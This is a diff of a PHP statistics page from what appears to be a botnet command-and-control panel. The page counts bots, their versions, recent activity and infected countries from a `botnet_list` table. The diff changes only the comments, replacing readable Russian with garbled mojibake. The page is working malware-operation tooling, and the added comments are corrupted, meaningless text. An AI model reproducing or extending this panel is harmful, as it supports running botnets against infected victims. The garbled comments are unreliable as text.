@@ -1,9 +1,9 @@
 <?php if(!defined('__CP__'))die();
 
-define('COUNTRYLIST_WIDTH', 200);  //Ширина колонки стран.
-define('STAT_WIDTH',        '1%'); //Ширина колонки статистики.
+define('COUNTRYLIST_WIDTH', 200);  //REReSЂReRЅR ° RєRѕR "RѕRЅRєRe SЃS, SЂR ° RЅ.
+define('STAT_WIDTH',        '1%'); //REReSЂReRЅR ° RєRѕR "RѕRЅRєRe SЃS, P ° C ReSЃS, ReRєRe.
 
-//Очистка списка Инсталлов.
+//REReSЂReRЅR ° RєRѕR "RѕRЅRєRe SЃS, P ° C ReSЃS, ReRєRe.
 if(isset($_GET['reset_newbots']) && !empty($userData['r_stats_main_reset']))
 {
   $query = 'UPDATE `botnet_list` SET `flag_new`=0';
@@ -16,18 +16,18 @@ if(isset($_GET['reset_newbots']) && !empty($userData['r_stats_main_reset']))
   die();
 }
 
-//Текущий ботнет.
+//RўRμRєSѓS Pepsi № ‰ P ± RѕS, RЅRμS.
 define('CURRENT_BOTNET', (!empty($_GET['botnet']) ? $_GET['botnet'] : ''));
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Вывод общей информации.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// R'S <RІRѕRґ RѕR ± C ‰ RμR number ReRЅS "RѕSЂRјR ° C † ReRe.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 $i = 0;
 $output = str_replace('{WIDTH}', (COUNTRYLIST_WIDTH * 2).'px', THEME_LIST_BEGIN).
           str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_TOTAL_INFO), THEME_LIST_TITLE);
 
-//Подсчет количества отчетов в базе данных
+//RџRѕRґSЃS ‡ RμS, RєRѕR "Republic ‡ RμSЃS, RІR ° RѕS, C ‡ RμS, RѕRІ RІ P ± P ° P · Rμ RґR ° RЅRЅS <C ...
 if(!empty($userData['r_reports_db']))
 {
   $reportsList  = listReportTables($config['mysql_db']);
@@ -44,9 +44,9 @@ if(!empty($userData['r_reports_db']))
 
 $output .= getBotnetStats('', $i).THEME_LIST_END.THEME_STRING_NEWLINE;
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Вывод информации об текущем ботнете.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// R'S <RІRѕRґ ReRЅS "RѕSЂRјR ° C † ReRe RѕR ± C RμRєSѓS RμRј ‰ P ± RѕS, RЅRμS, Rμ.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 $actionList = '';
 if(!empty($userData['r_stats_main_reset']))
@@ -64,7 +64,7 @@ str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
 str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_BOTNET.THEME_STRING_SPACE.botnetsToListBox(CURRENT_BOTNET, '')), THEME_DIALOG_TITLE).
 $actionList;
 
-//Сбор статистики для конкретного ботнета.
+//RЎR ± RѕSЂ SЃS, P ° C ReSЃS, ReRєRe RґR "SЏ RєRѕRЅRєSЂRμS, RЅRѕRіRѕ P ± RѕS, RЅRμS, P °.
 if(CURRENT_BOTNET != '')
 {
   $output .=
@@ -77,7 +77,7 @@ if(CURRENT_BOTNET != '')
     THEME_DIALOG_ROW_END;
 }
 
-//Вывод списка стран.
+//R'S <RІRѕRґ SЃRїReSЃRєR ° SЃS, SЂR ° RЅ.
 $commonQuery = ((CURRENT_BOTNET != '') ? ' AND botnet=\''.addslashes(CURRENT_BOTNET).'\'' : '');
 $output .= 
 THEME_DIALOG_ROW_BEGIN.  
@@ -94,9 +94,9 @@ ThemeBegin(LNG_STATS, 0, 0, 0);
 echo $output;
 ThemeEnd();
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Функции.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// P ¤ † SѓRЅRєS ReRe.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 /*
   Создание информации по ботнету.
@@ -118,12 +118,12 @@ function getBotnetStats($botnet, $i)
     $query2 = " AND `botnet`='{$botnet}'";
   }
   
-  //Количетсво ботов, и время первого отчета.
+  //RљRѕR "Republic ‡ RμS, SЃRІRѕ P ± RѕS, RѕRІ, Fe RІSЂRμRјSЏ RїRμSЂRІRѕRіRѕ RѕS, C ‡ RμS, P °.
   $tmp = htmlEntitiesEx(($mt = @mysql_fetch_row(mysqlQueryEx('botnet_list', "SELECT MIN(`rtime_first`), COUNT(`bot_id`), MIN(`bot_version`), MAX(`bot_version`) FROM `botnet_list`{$query1}"))) && $mt[0] > 0 ? gmdate(LNG_FORMAT_DT, $mt[0]) : '-');
   $data =
   THEME_LIST_ROW_BEGIN.
     str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_FIRST_BOT), $i == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2).
-    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, $tmp),            $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2). //Пусть будет num.
+    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, $tmp),            $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2). //RџSѓSЃS, SЊ P ± SѓRґRμS, num.
   THEME_LIST_ROW_END.
   THEME_LIST_ROW_BEGIN.
     str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_BOTS),          $i == 0 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
@@ -134,7 +134,7 @@ function getBotnetStats($botnet, $i)
   $minVersion = $mt[2];
   $maxVersion = $mt[3];
 
-  //Количетсво ботов активных за последнии 24 часа.
+  //RљRѕR "Republic ‡ RμS, SЃRІRѕ P ± RѕS, RѕRІ P ° RєS, ReRІRЅS <C ... P · P ° RїRѕSЃR" RμRґRЅReRe 24 C ‡ P ° SЃR °.
   $tmp = ($mt = @mysql_fetch_row(mysqlQueryEx('botnet_list', 'SELECT COUNT(`bot_id`) FROM `botnet_list` WHERE `rtime_last`>='.(CURRENT_TIME - 86400).$query2))) ? $mt[0] : 0;
   $data .= 
   THEME_LIST_ROW_BEGIN.
@@ -142,7 +142,7 @@ function getBotnetStats($botnet, $i)
     str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, ($totalBots > 0 ? numberFormatAsFloat(($tmp * 100) / $totalBots, 2) : 0).'% -  '.numberFormatAsInt($tmp)), $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2).
   THEME_LIST_ROW_END;
  
-  //Максимальная и минимальная версия бота.
+  //RњR RєSЃReRјR ° ° p "° SЊRЅR SЏ Re RјReRЅReRјR ° p" ° SЊRЅR SЏ RІRμSЂSЃReSЏ P ± RѕS, P °.
   $data .= 
   THEME_LIST_ROW_BEGIN.
     str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_MIN_VERSION),   $i == 0 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
@@ -156,14 +156,12 @@ function getBotnetStats($botnet, $i)
   return $data;
 }
 
-/*
-  Создание таблицы со списом стран.
-  
-  IN $name  - string, название таблицы.
-  IN $query - string, дополнительные условия для SQL-запроса.
-  
-  Return    - string, таблица.
-*/
+/*  RЎRѕR · RґR RЅReRμ ° C, P ° P ± P "Republic † C <SЃRѕ SЃRїReSЃRѕRј SЃS, SЂR ° RЅ.
+  
+  IN $ name - string, RЅR ° F · RІR RЅReRμ ° C, P ° P ± P "Republic † C <.
+  IN $ query - string, RґRѕRїRѕR "RЅReS, RμR" SЊRЅS <Rμ SѓSЃR "RѕRІReSЏ RґR" SЏ SQL-P · RїSЂRѕSЃR P ° °.
+  
+  Return - string, C, P ° P ± P "Republic † P °.*/
 function listCountries($name, $query)
 {
   $data = str_replace('{WIDTH}', COUNTRYLIST_WIDTH.'px', THEME_LIST_BEGIN);
@@ -171,7 +169,7 @@ function listCountries($name, $query)
   $r = mysqlQueryEx('botnet_list', 'SELECT `country`, COUNT(`country`) FROM `botnet_list` WHERE '.$query.' GROUP BY BINARY `country` ORDER BY COUNT(`country`) DESC, `country` ASC');
   if($r && @mysql_affected_rows() > 0)
   {
-    //Составляем список.
+    //RЎRѕSЃS, P ° RІR "SЏRμRј SЃRїReSЃRѕRє.
     $count = 0;
     $i     = 0;
     $list  = '';
@@ -188,10 +186,10 @@ function listCountries($name, $query)
       $i++;
     }
 
-    //Заголовок
+    //P-P ° RіRѕR "RѕRІRѕRє
     $data .= str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, sprintf($name, numberFormatAsInt($count))), THEME_LIST_TITLE).$list;
   }
-  //Ошибка.
+  //RћS € Pepsi ± RєR °.
   else
   {
     $data .= 
